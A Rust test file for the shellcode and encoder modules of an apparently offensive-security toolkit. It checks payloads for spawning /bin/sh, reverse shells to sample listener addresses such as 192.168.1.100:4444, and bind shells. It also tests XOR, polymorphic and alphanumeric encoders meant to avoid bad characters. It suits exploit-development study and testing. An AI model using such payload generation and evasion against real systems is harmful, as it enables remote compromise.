// ═══════════════════════════════════════════════════════════════════════════
// SHELLCODE MODULE COMPREHENSIVE TEST SUITE
// ═══════════════════════════════════════════════════════════════════════════

use std::collections::HashMap;

#[test]
fn test_shellcode_library_initialization() {
    let _lib = talon::shellcode_library::ShellcodeLibrary::new();
    assert!(true, "Library initialized successfully");
}

#[test]
fn test_x64_execve_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ExecveShBin,
    );

    assert!(shellcode.is_some(), "X64 execve shellcode should exist");
    let sc = shellcode.unwrap();
    assert!(!sc.is_empty(), "Shellcode should not be empty");
    assert!(sc.contains(&0x0f), "Should contain syscall opcode");
    assert!(sc.contains(&0x05), "Should contain syscall opcode");
}

#[test]
fn test_x64_exit_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::Exit,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert_eq!(sc.len(), 7, "X64 exit shellcode should be 7 bytes");
    assert_eq!(sc[sc.len() - 2], 0x0f, "Should end with syscall");
    assert_eq!(sc[sc.len() - 1], 0x05, "Should end with syscall");
}

#[test]
fn test_x64_nop_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::Nop,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert_eq!(sc.len(), 1);
    assert_eq!(sc[0], 0x90, "NOP opcode should be 0x90");
}

#[test]
fn test_x64_int3_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::Int3,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert_eq!(sc.len(), 1);
    assert_eq!(sc[0], 0xcc, "INT3 opcode should be 0xcc");
}

#[test]
fn test_x64_read_flag_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ReadFlag,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert!(!sc.is_empty());
    assert!(sc.len() > 20, "ReadFlag shellcode should be substantial");
}

#[test]
fn test_x86_execve_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X86,
        talon::shellcode_library::Payload::ExecveShBin,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert!(!sc.is_empty());
    assert!(sc.contains(&0xcd), "Should contain int 0x80 opcode");
    assert!(sc.contains(&0x80), "Should contain int 0x80 opcode");
}

#[test]
fn test_x86_exit_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X86,
        talon::shellcode_library::Payload::Exit,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert_eq!(sc.len(), 5, "X86 exit shellcode should be 5 bytes");
}

#[test]
fn test_x86_nop_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::X86,
        talon::shellcode_library::Payload::Nop,
    );

    assert!(shellcode.is_some());
    assert_eq!(shellcode.unwrap()[0], 0x90);
}

#[test]
fn test_arm_execve_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::ARM,
        talon::shellcode_library::Payload::ExecveShBin,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert!(!sc.is_empty());
}

#[test]
fn test_arm_exit_shellcode() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::ARM,
        talon::shellcode_library::Payload::Exit,
    );

    assert!(shellcode.is_some());
    let sc = shellcode.unwrap();
    assert_eq!(sc.len(), 6);
}

#[test]
fn test_unsupported_architecture_payload() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib.get(
        talon::shellcode_library::Architecture::ARM,
        talon::shellcode_library::Payload::ReadFlag,
    );

    assert!(
        shellcode.is_none(),
        "ARM ReadFlag should not be implemented"
    );
}

#[test]
fn test_reverse_shell_with_params() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "192.168.1.100".to_string());
    params.insert("lport".to_string(), "4444".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellReverseTcp,
        &params,
    );

    assert!(result.is_ok(), "Should generate reverse shell successfully");
    let shellcode = result.unwrap();
    assert!(!shellcode.is_empty());
    assert!(shellcode.len() > 50, "Reverse shell should be substantial");
}

#[test]
fn test_reverse_shell_missing_host() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lport".to_string(), "4444".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellReverseTcp,
        &params,
    );

    assert!(result.is_err());
    assert!(result.unwrap_err().contains("lhost"));
}

#[test]
fn test_reverse_shell_missing_port() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "192.168.1.1".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellReverseTcp,
        &params,
    );

    assert!(result.is_err());
    assert!(result.unwrap_err().contains("lport"));
}

#[test]
fn test_reverse_shell_invalid_ip() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "999.999.999.999".to_string());
    params.insert("lport".to_string(), "4444".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellReverseTcp,
        &params,
    );

    assert!(result.is_err());
}

#[test]
fn test_reverse_shell_invalid_port() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "192.168.1.1".to_string());
    params.insert("lport".to_string(), "not_a_port".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellReverseTcp,
        &params,
    );

    assert!(result.is_err());
}

#[test]
fn test_bind_shell_with_params() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lport".to_string(), "8888".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellBindTcp,
        &params,
    );

    assert!(result.is_ok());
    let shellcode = result.unwrap();
    assert!(!shellcode.is_empty());
}

#[test]
fn test_bind_shell_missing_port() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let params = HashMap::new();

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X64,
        talon::shellcode_library::Payload::ShellBindTcp,
        &params,
    );

    assert!(result.is_err());
}

#[test]
fn test_x86_reverse_shell() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "127.0.0.1".to_string());
    params.insert("lport".to_string(), "1234".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X86,
        talon::shellcode_library::Payload::ShellReverseTcp,
        &params,
    );

    assert!(result.is_ok());
}

#[test]
fn test_x86_bind_shell() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lport".to_string(), "5555".to_string());

    let result = lib.get_with_params(
        talon::shellcode_library::Architecture::X86,
        talon::shellcode_library::Payload::ShellBindTcp,
        &params,
    );

    assert!(result.is_ok());
}

#[test]
fn test_xor_encode_decode() {
    use talon::shellcode_encoders::{xor_decode, xor_encode};

    let original = vec![0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68];
    let key = 0x42;

    let encoded = xor_encode(&original, key);
    assert_ne!(encoded, original, "Encoded should differ from original");

    let decoded = xor_decode(&encoded, key);
    assert_eq!(decoded, original, "Decoded should match original");
}

#[test]
fn test_xor_encode_properties() {
    use talon::shellcode_encoders::xor_encode;

    let original = vec![0xaa, 0xbb, 0xcc, 0xdd];
    let key = 0x13;

    let encoded = xor_encode(&original, key);

    assert_eq!(encoded.len(), original.len());
    assert_eq!(encoded[0], 0xaa ^ 0x13);
    assert_eq!(encoded[1], 0xbb ^ 0x13);
}

#[test]
fn test_contains_bad_chars() {
    use talon::shellcode_encoders::contains_bad_chars;

    let clean_shellcode = vec![0x31, 0xc0, 0x50, 0x68];
    let bad_chars = vec![0x00, 0x0a, 0x0d];

    assert!(!contains_bad_chars(&clean_shellcode, &bad_chars));

    let dirty_shellcode = vec![0x31, 0x00, 0x50, 0x68];
    assert!(contains_bad_chars(&dirty_shellcode, &bad_chars));
}

#[test]
fn test_find_bad_chars() {
    use talon::shellcode_encoders::find_bad_chars;

    let shellcode = vec![0x31, 0x00, 0x50, 0x0a, 0x68, 0x0d];
    let bad_chars = vec![0x00, 0x0a, 0x0d];

    let found = find_bad_chars(&shellcode, &bad_chars);

    assert_eq!(found.len(), 3);
    assert_eq!(found[0], (1, 0x00));
    assert_eq!(found[1], (3, 0x0a));
    assert_eq!(found[2], (5, 0x0d));
}

#[test]
fn test_nop_sled() {
    use talon::shellcode_encoders::nop_sled;

    let sled = nop_sled(100);

    assert_eq!(sled.len(), 100);
    assert!(sled.iter().all(|&b| b == 0x90));
}

#[test]
fn test_polymorphic_nop_sled() {
    use talon::shellcode_encoders::polymorphic_nop_sled;

    let sled = polymorphic_nop_sled(100);

    assert_eq!(sled.len(), 100);

    let unique_bytes: std::collections::HashSet<_> = sled.iter().collect();
    assert!(unique_bytes.len() > 1, "Polymorphic sled should vary");
}

#[test]
fn test_shellcode_encoder_new() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50];
    let encoder = ShellcodeEncoder::new(shellcode.clone());

    assert_eq!(encoder.shellcode, shellcode);
    assert_eq!(encoder.bad_chars, vec![0x00, 0x0a, 0x0d]);
}

#[test]
fn test_shellcode_encoder_set_bad_chars() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50];
    let mut encoder = ShellcodeEncoder::new(shellcode);

    encoder.set_bad_chars(vec![0x00, 0xff]);
    assert_eq!(encoder.bad_chars, vec![0x00, 0xff]);
}

#[test]
fn test_shellcode_encoder_xor_encode_success() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50, 0x68];
    let encoder = ShellcodeEncoder::new(shellcode.clone());

    let result = encoder.xor_encode(0x42);

    assert!(result.is_ok());
    let encoded = result.unwrap();
    assert_eq!(encoded.len(), shellcode.len());
}

#[test]
fn test_shellcode_encoder_xor_encode_creates_bad_char() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x0a];
    let mut encoder = ShellcodeEncoder::new(shellcode);
    encoder.set_bad_chars(vec![0x00]);

    let result = encoder.xor_encode(0x0a);

    assert!(result.is_err());
}

#[test]
fn test_shellcode_encoder_find_xor_key() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50, 0x68];
    let encoder = ShellcodeEncoder::new(shellcode);

    let key = encoder.find_xor_key();

    assert!(key.is_some());
    let found_key = key.unwrap();
    assert!(found_key > 0);
}

#[test]
fn test_shellcode_encoder_find_xor_key_with_constraints() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50, 0x68];
    let mut encoder = ShellcodeEncoder::new(shellcode.clone());
    encoder.set_bad_chars(vec![0x00, 0x0a, 0x0d, 0x20]);

    let key = encoder.find_xor_key();

    if let Some(k) = key {
        let encoded = encoder.xor_encode(k);
        assert!(encoded.is_ok());
    }
}

#[test]
fn test_shellcode_encoder_alphanumeric_encode() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0xde, 0xad, 0xbe, 0xef];
    let encoder = ShellcodeEncoder::new(shellcode);

    let result = encoder.alphanumeric_encode();

    assert!(result.is_ok());
    let encoded = result.unwrap();

    assert_eq!(encoded.len(), 8);
    for &byte in &encoded {
        assert!(
            (byte >= b'0' && byte <= b'9') || (byte >= b'A' && byte <= b'F'),
            "Should be alphanumeric"
        );
    }
}

#[test]
fn test_shellcode_encoder_unicode_encode() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50];
    let encoder = ShellcodeEncoder::new(shellcode.clone());

    let encoded = encoder.unicode_encode();

    assert_eq!(encoded.len(), shellcode.len() * 2);
    for i in 0..shellcode.len() {
        assert_eq!(encoded[i * 2], shellcode[i]);
        assert_eq!(encoded[i * 2 + 1], 0x00);
    }
}

#[test]
fn test_shellcode_encoder_url_encode() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50];
    let encoder = ShellcodeEncoder::new(shellcode);

    let encoded = encoder.url_encode();

    assert_eq!(encoded, "%31%C0%50");
}

#[test]
fn test_shellcode_encoder_base64_encode() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x31, 0xc0, 0x50];
    let encoder = ShellcodeEncoder::new(shellcode);

    let encoded = encoder.base64_encode();

    assert!(!encoded.is_empty());
    assert!(encoded
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='));
}

#[test]
fn test_polymorphic_encode() {
    use talon::shellcode_encoders::polymorphic_encode;

    let shellcode = vec![0x31, 0xc0, 0x50, 0x68];
    let density = 0.5;

    let encoded = polymorphic_encode(&shellcode, density);

    assert!(encoded.len() >= shellcode.len());
    for &byte in &shellcode {
        assert!(encoded.contains(&byte), "Original bytes should be present");
    }
}

#[test]
fn test_polymorphic_encode_zero_density() {
    use talon::shellcode_encoders::polymorphic_encode;

    let shellcode = vec![0x31, 0xc0, 0x50];
    let encoded = polymorphic_encode(&shellcode, 0.0);

    assert_eq!(encoded, shellcode);
}

#[test]
fn test_polymorphic_encode_high_density() {
    use talon::shellcode_encoders::polymorphic_encode;

    let shellcode = vec![0x31, 0xc0];
    let encoded = polymorphic_encode(&shellcode, 2.0);

    assert!(encoded.len() > shellcode.len());
}

#[test]
fn test_shellcode_no_null_bytes() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib
        .get(
            talon::shellcode_library::Architecture::X64,
            talon::shellcode_library::Payload::ExecveShBin,
        )
        .unwrap();

    assert!(
        !shellcode.contains(&0x00),
        "X64 execve should not contain null bytes"
    );
}

#[test]
fn test_shellcode_x86_no_null_bytes() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let shellcode = lib
        .get(
            talon::shellcode_library::Architecture::X86,
            talon::shellcode_library::Payload::ExecveShBin,
        )
        .unwrap();

    let null_count = shellcode.iter().filter(|&&b| b == 0x00).count();
    assert!(null_count <= 1, "X86 execve should minimize null bytes");
}

#[test]
fn test_reverse_shell_ip_embedded() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "10.0.0.1".to_string());
    params.insert("lport".to_string(), "4444".to_string());

    let shellcode = lib
        .get_with_params(
            talon::shellcode_library::Architecture::X64,
            talon::shellcode_library::Payload::ShellReverseTcp,
            &params,
        )
        .unwrap();

    assert!(shellcode.contains(&10));
    assert!(shellcode.contains(&1));
}

#[test]
fn test_reverse_shell_port_embedded() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let mut params = HashMap::new();
    params.insert("lhost".to_string(), "127.0.0.1".to_string());
    params.insert("lport".to_string(), "31337".to_string());

    let shellcode = lib
        .get_with_params(
            talon::shellcode_library::Architecture::X64,
            talon::shellcode_library::Payload::ShellReverseTcp,
            &params,
        )
        .unwrap();

    let port: u16 = 31337;
    let port_bytes = port.to_be_bytes();
    assert!(shellcode.contains(&port_bytes[0]) || shellcode.contains(&port_bytes[1]));
}

#[test]
fn test_multiple_architectures_same_payload() {
    let lib = talon::shellcode_library::ShellcodeLibrary::new();

    let x64_exit = lib
        .get(
            talon::shellcode_library::Architecture::X64,
            talon::shellcode_library::Payload::Exit,
        )
        .unwrap();

    let x86_exit = lib
        .get(
            talon::shellcode_library::Architecture::X86,
            talon::shellcode_library::Payload::Exit,
        )
        .unwrap();

    let arm_exit = lib
        .get(
            talon::shellcode_library::Architecture::ARM,
            talon::shellcode_library::Payload::Exit,
        )
        .unwrap();

    assert_ne!(x64_exit, x86_exit);
    assert_ne!(x64_exit, arm_exit);
    assert_ne!(x86_exit, arm_exit);
}

#[test]
fn test_xor_key_avoids_bad_chars() {
    use talon::shellcode_encoders::ShellcodeEncoder;

    let shellcode = vec![0x50, 0x51, 0x52];
    let mut encoder = ShellcodeEncoder::new(shellcode.clone());
    encoder.set_bad_chars(vec![0x00, 0x0a, 0x0d]);

    let key = encoder.find_xor_key().expect("Should find a key");

    for &byte in &shellcode {
        let encoded = byte ^ key;
        assert!(!encoder.bad_chars.contains(&encoded));
    }
}
